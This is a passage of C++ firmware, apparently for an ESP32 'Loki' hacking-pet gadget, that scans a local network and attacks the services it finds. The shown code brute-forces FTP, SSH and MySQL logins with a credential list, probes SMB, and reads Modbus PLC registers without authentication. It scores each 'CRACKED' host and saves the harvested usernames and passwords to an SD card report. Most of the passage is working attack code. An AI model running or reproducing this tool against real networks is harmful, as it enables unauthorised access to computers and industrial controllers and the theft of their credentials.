            LokiPet::setStatus("FTPBruteforce", ipStr);
            dev.status = STATUS_TESTING;
            bool cracked = false;
            int connFails = 0;

            LokiPet::addKillLine(("[>] FTP brute " + String(ipStr)).c_str(), LOKI_CYAN);

            for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                const char* user; const char* pass;
                getCred(c, user, pass);

                if (c > 0 && c % 10 == 0) {
                    char msg[52]; snprintf(msg, sizeof(msg), "[>] %s FTP [%d/%d]", ipStr, c, totalCredCount);
                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
                }

                if (client.connect(devIP, 21, 2000)) {
                    connFails = 0;
                    // Wait for 220 banner
                    t0 = millis(); String resp = "";
                    while (client.connected() && millis() - t0 < 3000 && resp.length() < 256) {
                        while (client.available()) resp += (char)client.read();
                        if (resp.indexOf("\n") >= 0) break;
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }

                    // USER
                    client.printf("USER %s\r\n", user);
                    resp = ""; t0 = millis();
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                        while (client.available()) resp += (char)client.read();
                        if (resp.indexOf("\n") >= 0) break;
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }

                    if (resp.startsWith("230")) {
                        // Anonymous login
                        cracked = true;
                        strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                        strncpy(dev.credPass, "(anon)", LOKI_MAX_CRED_PASS - 1);
                        dev.status = STATUS_CRACKED; servicesCracked++;
                        LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 21, user, "(anon)");
                        LokiPet::setMood(MOOD_CRACKED);
                        char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s FTP %s (anon)", ipStr, user);
                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
                    } else if (resp.startsWith("331")) {
                        // Need password
                        client.printf("PASS %s\r\n", pass);
                        resp = ""; t0 = millis();
                        while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                            while (client.available()) resp += (char)client.read();
                            if (resp.indexOf("\n") >= 0) break;
                            vTaskDelay(pdMS_TO_TICKS(50));
                        }

                        if (resp.startsWith("230")) {
                            cracked = true;
                            strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                            strncpy(dev.credPass, pass, LOKI_MAX_CRED_PASS - 1);
                            dev.status = STATUS_CRACKED; servicesCracked++;
                            LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 21, user, pass);
                            LokiPet::setMood(MOOD_CRACKED);
                            char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s FTP %s:%s", ipStr, user, pass);
                            LokiPet::addKillLine(msg, LOKI_HOTPINK);
                        }
                    }
                    client.print("QUIT\r\n"); delay(100);
                    client.stop();
                } else if (++connFails >= 5) {
                    LokiPet::addKillLine(("[!] " + String(ipStr) + " FTP blocked").c_str(), LOKI_TEXT_DIM);
                    break;
                }
                vTaskDelay(1);
            }

            if (!cracked && dev.status == STATUS_TESTING) {
                if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s FTP", ipStr);
                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
            }
        }

        // ── SSH: Brute force using LibSSH ──
        if ((dev.openPorts & PORT_SSH) && running) {
            LokiPet::setStatus("SSHBruteforce", ipStr);
            dev.status = STATUS_TESTING;
            bool cracked = false;

            LokiPet::addKillLine(("[>] SSH brute " + String(ipStr)).c_str(), LOKI_CYAN);

            for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                const char* user; const char* pass;
                getCred(c, user, pass);

                if (c > 0 && c % 20 == 0) {
                    char msg[52]; snprintf(msg, sizeof(msg), "[>] %s SSH [%d/%d]", ipStr, c, totalCredCount);
                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
                }

                ssh_session session = ssh_new();
                if (!session) continue;

                ssh_options_set(session, SSH_OPTIONS_HOST, ipStr);
                ssh_options_set(session, SSH_OPTIONS_USER, user);
                int port = 22;
                ssh_options_set(session, SSH_OPTIONS_PORT, &port);
                long timeout = 5;
                ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);

                if (ssh_connect(session) == SSH_OK) {
                    if (ssh_userauth_password(session, NULL, pass) == SSH_AUTH_SUCCESS) {
                        cracked = true;
                        strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                        strncpy(dev.credPass, pass, LOKI_MAX_CRED_PASS - 1);
                        dev.status = STATUS_CRACKED; servicesCracked++;
                        LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 22, user, pass);
                        LokiPet::setMood(MOOD_CRACKED);
                        char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s SSH %s:%s", ipStr, user, pass);
                        LokiPet::addKillLine(msg, LOKI_HOTPINK);
                    }
                    ssh_disconnect(session);
                }
                ssh_free(session);
                vTaskDelay(1);
            }

            if (!cracked && dev.status == STATUS_TESTING) {
                if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s SSH", ipStr);
                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
            }
        }

        // ── SMB: NTLM brute force (port 445) ──
        if ((dev.openPorts & PORT_SMB) && running) {
            LokiPet::setStatus("SMBBruteforce", ipStr);
            dev.status = STATUS_TESTING;
            bool cracked = false;
            int connFails = 0;

            LokiPet::addKillLine(("[>] SMB brute " + String(ipStr)).c_str(), LOKI_CYAN);

            for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                const char* user; const char* pass;
                getCred(c, user, pass);

                if (c > 0 && c % 20 == 0) {
                    char msg[52]; snprintf(msg, sizeof(msg), "[>] %s SMB [%d/%d]", ipStr, c, totalCredCount);
                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
                }

                // SMB uses the same SSH library via NTLM — too complex for raw TCP
                // Use a TCP connect + SMB negotiate to detect if auth is needed
                if (client.connect(devIP, 445, 1000)) {
                    connFails = 0;
                    // Send SMB negotiate protocol request
                    uint8_t smbNeg[] = {
                        0x00, 0x00, 0x00, 0x85, // NetBIOS session
                        0xFF, 0x53, 0x4D, 0x42, // SMB magic
                        0x72,                     // Negotiate
                        0x00, 0x00, 0x00, 0x00,  // Status
                        0x18, 0x53, 0xC8,        // Flags
                        0x00, 0x00,              // Flags2
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Pad
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Pad
                        0x00, 0x00, 0x00, 0x00,  // TreeID/ProcID
                    };
                    client.write(smbNeg, sizeof(smbNeg));

                    t0 = millis();
                    bool gotResp = false;
                    while (client.connected() && millis() - t0 < 2000) {
                        if (client.available() >= 4) { gotResp = true; break; }
                        vTaskDelay(1);
                    }
                    client.stop();

                    // SMB negotiation response indicates service is alive
                    // Real SMB auth needs a full NTLM exchange — mark as detected for now
                    if (gotResp && c == 0) {
                        // Check if guest/anonymous access works
                        // TODO: Implement full NTLM auth sequence
                        char msg[52]; snprintf(msg, sizeof(msg), "[*] SMB %s responds", ipStr);
                        LokiPet::addKillLine(msg, LOKI_CYAN);
                    }
                } else if (++connFails >= 5) break;
                vTaskDelay(1);

                // Break after first attempt — full SMB brute needs NTLM implementation
                break;
            }

            if (!cracked && dev.status == STATUS_TESTING) {
                dev.status = STATUS_FOUND;  // Not locked, just can't brute yet
            }
        }

        // ── MySQL: Brute force (port 3306) ──
        if ((dev.openPorts & PORT_MYSQL) && running) {
            LokiPet::setStatus("MySQLBruteforce", ipStr);
            dev.status = STATUS_TESTING;
            bool cracked = false;
            int connFails = 0;

            LokiPet::addKillLine(("[>] MySQL brute " + String(ipStr)).c_str(), LOKI_CYAN);

            for (int c = 0; c < totalCredCount && running && !cracked; c++) {
                const char* user; const char* pass;
                getCred(c, user, pass);

                if (c > 0 && c % 20 == 0) {
                    char msg[52]; snprintf(msg, sizeof(msg), "[>] %s MySQL [%d/%d]", ipStr, c, totalCredCount);
                    LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
                }

                if (client.connect(devIP, 3306, 2000)) {
                    connFails = 0;
                    // Read MySQL greeting
                    t0 = millis();
                    uint8_t greeting[128];
                    int gLen = 0;
                    while (client.connected() && millis() - t0 < 3000 && gLen < 128) {
                        while (client.available() && gLen < 128) greeting[gLen++] = client.read();
                        if (gLen > 4) break;
                        vTaskDelay(1);
                    }

                    if (gLen > 36) {
                        // Extract salt from greeting for auth
                        // MySQL native auth: SHA1(password) XOR SHA1(salt + SHA1(SHA1(password)))
                        // This is complex — for now detect if no-password access works

                        // Build auth packet with empty password
                        uint8_t authPkt[64];
                        int pLen = 0;
                        // Packet header (length + seq)
                        authPkt[3] = 1; // Sequence number
                        // Client capabilities
                        authPkt[4] = 0x0D; authPkt[5] = 0xA6;
                        authPkt[6] = 0x03; authPkt[7] = 0x00;
                        // Max packet size
                        authPkt[8] = 0x00; authPkt[9] = 0x00;
                        authPkt[10] = 0x00; authPkt[11] = 0x01;
                        // Charset (UTF8)
                        authPkt[12] = 0x21;
                        // Reserved (23 bytes of 0)
                        memset(&authPkt[13], 0, 23);
                        pLen = 36;
                        // Username
                        int uLen = strlen(user);
                        memcpy(&authPkt[pLen], user, uLen);
                        pLen += uLen;
                        authPkt[pLen++] = 0; // null terminator
                        // Password length (0 = empty)
                        authPkt[pLen++] = 0;
                        // Set packet length
                        int bodyLen = pLen - 4;
                        authPkt[0] = bodyLen & 0xFF;
                        authPkt[1] = (bodyLen >> 8) & 0xFF;
                        authPkt[2] = (bodyLen >> 16) & 0xFF;

                        client.write(authPkt, pLen);

                        // Read response
                        t0 = millis();
                        uint8_t resp[64];
                        int rLen = 0;
                        while (client.connected() && millis() - t0 < 2000 && rLen < 64) {
                            while (client.available() && rLen < 64) resp[rLen++] = client.read();
                            if (rLen > 4) break;
                            vTaskDelay(1);
                        }

                        // Check OK packet (0x00) or Error (0xFF)
                        if (rLen > 4 && resp[4] == 0x00) {
                            cracked = true;
                            strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                            strncpy(dev.credPass, "(empty)", LOKI_MAX_CRED_PASS - 1);
                            dev.status = STATUS_CRACKED; servicesCracked++;
                            LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 3306, user, "(empty)");
                            LokiPet::setMood(MOOD_CRACKED);
                            char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s MySQL %s", ipStr, user);
                            LokiPet::addKillLine(msg, LOKI_HOTPINK);
                        }
                    }
                    client.stop();
                } else if (++connFails >= 5) break;
                vTaskDelay(1);
            }

            if (!cracked && dev.status == STATUS_TESTING) {
                if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s MySQL", ipStr);
                LokiPet::addKillLine(msg, LOKI_TEXT_DIM);
            }
        }

        // ── RDP: Connection test (port 3389) ──
        if ((dev.openPorts & PORT_RDP) && dev.status != STATUS_CRACKED && running) {
            // RDP brute force requires CredSSP/NLA which needs TLS — too complex for raw TCP
            // Log as detected service
            char msg[52]; snprintf(msg, sizeof(msg), "[*] RDP %s detected", ipStr);
            LokiPet::addKillLine(msg, LOKI_CYAN);
        }

        // ── MODBUS: Read registers (no auth) ──
        if (dev.type == DEV_MODBUS_PLC && running) {
            if (client.connect(devIP, 502, 2000)) {
                uint8_t modbusReq[] = {
                    0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
                    0x01, 0x03, 0x00, 0x00, 0x00, 0x0A
                };
                client.write(modbusReq, sizeof(modbusReq));
                t0 = millis(); bool gotResp = false;
                while (client.connected() && millis() - t0 < 2000) {
                    if (client.available() >= 9) { gotResp = true; break; }
                    vTaskDelay(1);
                }
                client.stop();

                if (gotResp) {
                    dev.status = STATUS_OPEN; servicesCracked++;
                    LokiScoreManager::addServiceCracked();
                    char msg[52]; snprintf(msg, sizeof(msg), "[*] OPEN %s Modbus (no auth)", ipStr);
                    LokiPet::addKillLine(msg, LOKI_GREEN);
                    LokiPet::setMood(MOOD_CRACKED);
                } else {
                    if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
                }
            }
        }

        vTaskDelay(1);
    }

    // =========================================================================
    // PHASE 4: DONE
    // =========================================================================
    scanPhase = PHASE_DONE;
    LokiScoreManager::addScanCompleted();
    LokiScoreManager::save();

    {
        char msg[52];
        snprintf(msg, sizeof(msg), "=== DONE: %d hosts, %d cracked ===", (int)hostsFound, (int)servicesCracked);
        LokiPet::addKillLine(msg, LOKI_GOLD);
        LokiPet::setStatus("IDLE");
        LokiPet::setMood(servicesCracked > 0 ? MOOD_HAPPY : MOOD_BORED);
    }

    // Save report to SD
    {
        SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
        if (SD.begin(SD_CS, SPI, 4000000)) {
            File f = SD.open("/loki/report.txt", FILE_WRITE);
            if (f) {
                f.println("=== Loki CYD Recon Report ===");
                f.printf("Network: %d.%d.%d.%d/24\n", gatewayIP[0], gatewayIP[1], gatewayIP[2], 0);
                f.printf("Hosts: %d  Cracked: %d\n\n", (int)hostsFound, (int)servicesCracked);

                for (int d = 0; d < deviceCount; d++) {
                    LokiDevice& dev = devices[d];
                    char ip[16]; ipToStr(dev.ip, ip, sizeof(ip));
                    f.printf("[%s] %s (%s)\n",
                        dev.status == STATUS_CRACKED ? "CRACKED" :
                        dev.status == STATUS_OPEN ? "OPEN" :
                        dev.status == STATUS_LOCKED ? "LOCKED" : "FOUND",
                        ip, dev.banner);
                    if (dev.status == STATUS_CRACKED) {
                        f.printf("  Creds: %s:%s\n", dev.credUser, dev.credPass);
                    }
                    f.print("  Ports:");
                    for (int p = 0; p < LOKI_MAX_PORTS; p++) {
                        if (dev.openPorts & (1 << p)) f.printf(" %d(%s)", scanPorts[p], portNames[p]);
                    }
                    f.println("\n");
                }
                f.close();
                LokiPet::addKillLine("[*] Report saved to SD", LOKI_GREEN);
            }
            SD.end();
        }
    }

task_exit:
    running = false;
    done = true;
    scanTaskHandle = NULL;
    vTaskDelete(NULL);
}

// =============================================================================
// PUBLIC API
// =============================================================================

void setup() {
    deviceCount = 0;
    scanPhase = PHASE_IDLE;
    running = false; done = false;
    hostsFound = portsFound = servicesCracked = filesStolen = vulnsFound = 0;
}

void start() {
    if (scanTaskHandle) return;
    setup();
    running = true; done = false;
    xTaskCreatePinnedToCore(scanTask, "LokiRecon", 16384, NULL, 1, &scanTaskHandle, 0);
}

void stop() {
    running = false;
    if (scanTaskHandle) {
        unsigned long t0 = millis();
        while (!done && millis() - t0 < 2000) vTaskDelay(pdMS_TO_TICKS(10));
        scanTaskHandle = NULL;
    }
}

bool isRunning() { return running; }
bool isDone() { return done; }
LokiScanPhase getPhase() { return scanPhase; }
LokiDevice* getDevices() { return devices; }
int getDeviceCount() { return deviceCount; }
LokiCredEntry* getCredLog() { return credLog; }
int getCredLogCount() { return credLogCount; }

void clearDevices() {
    deviceCount = 0;
    hostsFound = 0;
    portsFound = 0;
    memset(devices, 0, sizeof(devices));
    Serial.println("[RECON] Devices cleared");
}

void clearCredLog() {
    credLogCount = 0;
    servicesCracked = 0;
    memset(credLog, 0, sizeof(credLog));
    Serial.println("[RECON] Credentials cleared");
}

LokiScore getStats() {
    LokiScore s;
    s.hostsFound = hostsFound; s.portsFound = portsFound;
    s.servicesCracked = servicesCracked; s.filesStolen = filesStolen;
    s.vulnsFound = vulnsFound; s.totalScans = done ? 1 : 0;
    s.xp = LokiScoreManager::get().xp;
    return s;
}

void setWiFi(const char* newSSID, const char* newPass) {
    strncpy(ssid, newSSID, sizeof(ssid) - 1);
    strncpy(pass, newPass, sizeof(pass) - 1);
}

void cleanup() { stop(); WiFi.disconnect(); WiFi.mode(WIFI_OFF); }

}  // namespace LokiRecon
